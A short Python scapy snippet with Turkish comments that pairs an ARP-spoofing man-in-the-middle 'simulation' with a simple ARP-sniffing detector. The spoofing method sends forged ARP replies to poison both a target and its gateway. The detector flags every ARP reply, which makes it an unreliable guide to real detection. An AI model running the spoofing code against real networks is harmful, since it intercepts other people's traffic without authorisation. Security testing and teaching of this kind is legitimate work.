# MITM saldırı simülasyonu ve savunma
from scapy.all import *
import threading

class SecurityTester:
    def __init__(self):
        self.attack_detected = False
        self.monitoring_active = False
        
    def simulate_mitm_attack(self, target_ip, gateway_ip):
        """ARP spoofing ile MITM saldırısı simülasyonu"""
        # ARP tablo manipülasyonu
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        
        if target_mac and gateway_mac:
            # Sahte ARP paketleri gönder
            arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            
            print("[ATTACK] MITM saldırısı başlatılıyor...")
            send(arp_target, verbose=False)
            send(arp_gateway, verbose=False)
            
    def detect_mitm_attack(self):
        """MITM saldırısı tespit sistemi"""
        def packet_handler(packet):
            if packet.haslayer(ARP):
                # Şüpheli ARP trafiği tespiti
                if packet[ARP].op == 2:  # ARP reply
                    print(f"[DETECTION] Şüpheli ARP paketi: {packet[ARP].psrc}")
                    self.attack_detected = True
                    
        # Paket dinleme
        sniff(prn=packet_handler, filter="arp", timeout=30)